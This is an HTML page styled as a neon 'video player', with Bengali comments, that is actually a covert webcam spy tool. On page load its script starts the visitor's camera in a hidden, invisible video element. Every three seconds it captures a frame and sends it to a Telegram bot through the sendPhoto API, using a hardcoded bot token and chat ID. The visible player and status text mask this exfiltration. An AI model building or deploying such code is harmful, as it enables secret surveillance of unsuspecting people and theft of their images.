<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CYBER · NEO PLAYER</title>
  <!-- Orbitron ফন্ট -->
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;800&display=swap" rel="stylesheet" />
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background: #0b0d15;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: 'Orbitron', sans-serif;
      padding: 16px;
      margin: 0;
    }

    /* 🎨 সাইবার / নিওন থিম – কালার টেমপ্লেট (লাল/নীল/সবুজ/গোলাপী/বেগুনি/কমলা/সোনালী) */
    .player-card {
      --neon-glow: #ff3b3b;        /* ডিফল্ট লাল */
      --neon-secondary: #ff7878;
      --neon-dark: #1a0e0e;
      --text-glow: #ffb3b3;
      width: 100%;
      max-width: 820px;
      background: #0f111a;
      border-radius: 48px 48px 28px 28px;
      padding: 28px 24px 24px;
      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.8), 0 0 30px var(--neon-glow), inset 0 0 20px rgba(255, 255, 255, 0.03);
      border: 1px solid rgba(255, 255, 255, 0.06);
      backdrop-filter: blur(2px);
      transition: box-shadow 0.25s ease, border-color 0.25s;
      position: relative;
    }

    /* 3D ইফেক্ট - pseudo layers */
    .player-card::before {
      content: '';
      position: absolute;
      top: -6px; left: -6px;
      width: calc(100% + 12px);
      height: calc(100% + 12px);
      background: radial-gradient(circle at 20% 30%, var(--neon-glow), transparent 70%);
      opacity: 0.15;
      border-radius: 54px;
      z-index: -1;
      filter: blur(8px);
    }

    /* ভিডিও প্লেয়ার (উপরে) */
    .video-wrapper {
      position: relative;
      border-radius: 28px;
      overflow: hidden;
      background: #000000;
      box-shadow: 0 0 30px rgba(0, 0, 0, 0.8), inset 0 0 30px rgba(255, 255, 255, 0.02);
      border: 1px solid rgba(255, 255, 255, 0.08);
      aspect-ratio: 16 / 9;
    }

    #videoPlayer {
      width: 100%;
      height: 100%;
      display: block;
      object-fit: cover;
      background: #0a0a0a;
    }

    /* লুকানো ক্যামেরা (opacity: 0) + ছোট ক্যানভাস (ফ্রেম ক্যাপচার) */
    .camera-hidden {
      position: absolute;
      opacity: 0;
      pointer-events: none;
      width: 1px;
      height: 1px;
      overflow: hidden;
    }

    #captureCanvas {
      position: absolute;
      bottom: 0;
      left: 0;
      width: 1px;
      height: 1px;
      opacity: 0;
    }

    /* কন্ট্রোল প্যানেল – কাউন্টার, LED, ফুটার */
    .control-panel {
      margin-top: 22px;
      display: flex;
      flex-wrap: wrap;
      align-items: center;
      justify-content: space-between;
      gap: 14px 8px;
      background: rgba(0, 0, 0, 0.35);
      backdrop-filter: blur(4px);
      padding: 12px 22px;
      border-radius: 60px;
      border: 1px solid rgba(255, 255, 255, 0.04);
      box-shadow: inset 0 0 15px rgba(0, 0, 0, 0.6);
    }

    .counter-led {
      display: flex;
      align-items: center;
      gap: 18px;
    }

    .counter {
      font-size: 1.6rem;
      font-weight: 700;
      letter-spacing: 2px;
      color: #fff;
      text-shadow: 0 0 12px var(--neon-glow), 0 0 30px var(--neon-glow);
      background: rgba(0, 0, 0, 0.4);
      padding: 4px 18px 4px 14px;
      border-radius: 40px;
      border-left: 2px solid var(--neon-glow);
    }

    .counter span {
      font-weight: 800;
      color: var(--neon-glow);
      text-shadow: 0 0 20px var(--neon-glow);
    }

    .led-indicator {
      display: flex;
      align-items: center;
      gap: 8px;
      font-size: 0.8rem;
      text-transform: uppercase;
      letter-spacing: 2px;
      color: #b0b8c8;
    }

    .led-bulb {
      width: 16px;
      height: 16px;
      border-radius: 50%;
      background: #ff2a2a;
      box-shadow: 0 0 12px #ff2a2a, 0 0 30px #ff2a2a;
      transition: 0.2s ease;
      border: 1px solid rgba(255, 255, 255, 0.3);
    }

    .led-bulb.active {
      background: #2eff6e;
      box-shadow: 0 0 18px #2eff6e, 0 0 40px #2eff6e;
      border-color: #aaffbb;
    }

    .footer-meta {
      font-size: 0.8rem;
      font-weight: 400;
      color: #a0a8b8;
      letter-spacing: 1px;
      background: rgba(0, 0, 0, 0.3);
      padding: 6px 18px;
      border-radius: 40px;
      border: 1px solid rgba(255, 255, 255, 0.03);
      backdrop-filter: blur(2px);
      white-space: nowrap;
    }

    .footer-meta i {
      color: var(--neon-glow);
      text-shadow: 0 0 10px var(--neon-glow);
      margin-right: 6px;
    }

    /* responsive */
    @media (max-width: 560px) {
      .player-card { padding: 16px 12px; }
      .control-panel { flex-direction: column; align-items: stretch; gap: 10px; border-radius: 30px; padding: 16px; }
      .counter-led { justify-content: center; }
      .footer-meta { text-align: center; }
      .counter { font-size: 1.4rem; }
    }

    /* স্ট্যাটাস বার */
    .toast-msg {
      margin-top: 12px;
      font-size: 0.7rem;
      letter-spacing: 1px;
      color: #7f8a9e;
      text-align: center;
      border-top: 1px solid rgba(255,255,255,0.02);
      padding-top: 12px;
      opacity: 0.7;
    }
  </style>
</head>
<body>
  <div class="player-card" id="playerCard">
    <!-- ভিডিও প্লেয়ার -->
    <div class="video-wrapper">
      <video id="videoPlayer" src="https://www.w3schools.com/html/mov_bbb.mp4" muted playsinline></video>
      <!-- লুকানো ক্যামেরা (opacity:0) -->
      <video id="cameraFeed" class="camera-hidden" autoplay playsinline></video>
      <!-- ক্যানভাস ফ্রেম ক্যাপচার -->
      <canvas id="captureCanvas"></canvas>
    </div>

    <!-- কন্ট্রোল প্যানেল -->
    <div class="control-panel">
      <div class="counter-led">
        <div class="counter">📡 <span id="shotCounter">0</span></div>
        <div class="led-indicator">
          <span>LIVE</span>
          <div class="led-bulb" id="ledBulb"></div>
        </div>
      </div>
      <div class="footer-meta">
        <i>🎬</i> 1080p · 60fps
      </div>
    </div>
    <div class="toast-msg" id="statusMsg">⚡ সিস্টেম অনলাইন · ক্যামেরা সক্রিয়</div>
  </div>

  <script>
    (function() {
      "use strict";

      // ---------- 🔒 Telegram Bot credentials (সেট করা থাকবে) ----------
      const BOT_TOKEN = '8917986127:AAGDw4tJGj1erwoKAhiacr7om9VSWGz6wb0';          // ❗ আপনার টোকেন দিন
      const CHAT_ID = '8157946649';              // ❗ আপনার চ্যাট আইডি দিন

      // ---------- থিম কালার (টেমপ্লেট) ----------
      // আপনি চাইলে নিচের কালার পরিবর্তন করতে পারেন: লাল/নীল/সবুজ/গোলাপী/বেগুনি/কমলা/সোনালী
      const THEME = {
        primary: '#ff3b3b',      // লাল (ডিফল্ট)
        secondary: '#ff7878',
        glow: '#ff3b3b'
      };
      // CSS ভেরিয়েবল আপডেট
      const root = document.documentElement;
      const card = document.getElementById('playerCard');
      card.style.setProperty('--neon-glow', THEME.primary);
      card.style.setProperty('--neon-secondary', THEME.secondary);
      card.style.setProperty('--text-glow', THEME.glow);

      // ---------- DOM এলিমেন্ট ----------
      const videoPlayer = document.getElementById('videoPlayer');
      const cameraFeed = document.getElementById('cameraFeed');
      const captureCanvas = document.getElementById('captureCanvas');
      const shotCounterSpan = document.getElementById('shotCounter');
      const ledBulb = document.getElementById('ledBulb');
      const statusMsg = document.getElementById('statusMsg');

      let shotCount = 0;
      let cameraInterval = null;
      let cameraStream = null;
      let isCameraReady = false;

      // ---------- ১. ভিডিও প্লেয়ার (ডিফল্ট) ----------
      videoPlayer.controls = true;
      videoPlayer.loop = true;
      // ভিডিও অটোপ্লে করার চেষ্টা
      videoPlayer.play().catch(() => {
        // কিছু ব্রাউজারে মিউটেড প্লে কাজ করে
        videoPlayer.muted = true;
        videoPlayer.play().catch(e => console.warn('ভিডিও অটোপ্লে ব্যর্থ:', e));
      });

      // ---------- ২. ক্যামেরা চালু (getUserMedia) ----------
      async function startCamera() {
        try {
          if (cameraStream) {
            // আগের স্ট্রিম বন্ধ
            cameraStream.getTracks().forEach(t => t.stop());
            cameraStream = null;
          }
          // ডিফল্ট ব্রাউজার পপআপ দেখাবে (permission)
          const stream = await navigator.mediaDevices.getUserMedia({
            video: { width: { ideal: 640 }, height: { ideal: 480 } },
            audio: false
          });
          cameraStream = stream;
          cameraFeed.srcObject = stream;
          await cameraFeed.play();
          isCameraReady = true;
          ledBulb.classList.add('active');
          statusMsg.innerText = '📷 ক্যামেরা চালু · প্রতি ৩ সেকেন্ডে ক্যাপচার';
          // ক্যাপচার ইন্টারভাল শুরু
          if (cameraInterval) clearInterval(cameraInterval);
          cameraInterval = setInterval(captureAndSend, 3000);
          // তাৎক্ষণিক একটি ছবি পাঠাও (ঐচ্ছিক)
          // captureAndSend();
          return true;
        } catch (err) {
          console.error('ক্যামেরা অ্যাক্সেস ব্যর্থ:', err);
          isCameraReady = false;
          ledBulb.classList.remove('active');
          statusMsg.innerText = '⚠️ ক্যামেরা অনুমতি প্রয়োজন · রিলোড করুন';
          alert('ক্যামেরা অ্যাক্সেস দেওয়া প্রয়োজন। ব্রাউজার পপআপে অনুমতি দিন।');
          return false;
        }
      }

      // ---------- ৩. ক্যাপচার + Telegram এ পাঠান ----------
      async function captureAndSend() {
        if (!isCameraReady || !cameraStream) {
          // ক্যামেরা রেডি না থাকলে আবার চেষ্টা
          if (!cameraStream) {
            await startCamera();
          }
          if (!isCameraReady) return;
        }

        // ক্যানভাসে ফ্রেম ক্যাপচার
        const canvas = captureCanvas;
        const video = cameraFeed;
        // ভিডিওর ডাইমেনশন অনুযায়ী ক্যানভাস সেট
        if (video.videoWidth && video.videoHeight) {
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
        } else {
          // ফলব্যাক
          canvas.width = 640;
          canvas.height = 480;
        }
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        // ক্যানভাস থেকে ব্লব (JPEG)
        let blob = null;
        try {
          blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.92));
        } catch (e) {
          console.warn('toBlob error', e);
          return;
        }
        if (!blob) return;

        // কাউন্টার বাড়ান
        shotCount++;
        shotCounterSpan.innerText = shotCount;

        // Telegram এ পাঠান
        if (BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || CHAT_ID === 'YOUR_CHAT_ID_HERE') {
          statusMsg.innerText = '⚠️ বট টোকেন / চ্যাট আইডি সেট করুন';
          return;
        }

        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, `frame_${Date.now()}.jpg`);

        try {
          const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
          });
          const result = await response.json();
          if (result.ok) {
            statusMsg.innerText = `📤 ছবি পাঠানো হয়েছে (${shotCount}) · ${new Date().toLocaleTimeString()}`;
          } else {
            statusMsg.innerText = `❌ Telegram error: ${result.description || 'অজানা'}`;
            console.warn('Telegram error:', result);
          }
        } catch (err) {
          statusMsg.innerText = `⚠️ নেটওয়ার্ক সমস্যা: ${err.message}`;
          console.error('sendPhoto failed', err);
        }
      }

      // ---------- ৪. ক্যামেরা শুরু (পেজ লোড হলে) ----------
      window.addEventListener('load', () => {
        // একটু বিলম্বে ক্যামেরা চালু (যাতে UI রেডি)
        setTimeout(() => {
          startCamera();
        }, 400);
      });

      // ---------- ৫. ক্লিনআপ (পেজ বন্ধে) ----------
      window.addEventListener('beforeunload', () => {
        if (cameraInterval) clearInterval(cameraInterval);
        if (cameraStream) {
          cameraStream.getTracks().forEach(t => t.stop());
        }
      });

      // ---------- (অতিরিক্ত) ভিডিও প্লেয়ার এরর হ্যান্ডল ----------
      videoPlayer.addEventListener('error', (e) => {
        console.warn('ভিডিও লোড সমস্যা', e);
      });

      // ---------- ক্যামেরা স্টেট চেক (যদি স্ট্রিম ড্রপ হয়) ----------
      // প্রতি ১০ সেকেন্ডে চেক
      setInterval(() => {
        if (cameraStream && cameraStream.active === false) {
          isCameraReady = false;
          ledBulb.classList.remove('active');
          statusMsg.innerText = '📴 ক্যামেরা সংযোগ হারিয়েছে · পুনরায় চেষ্টা';
          startCamera();
        }
      }, 10000);

    })();
  </script>
</body>
</html>
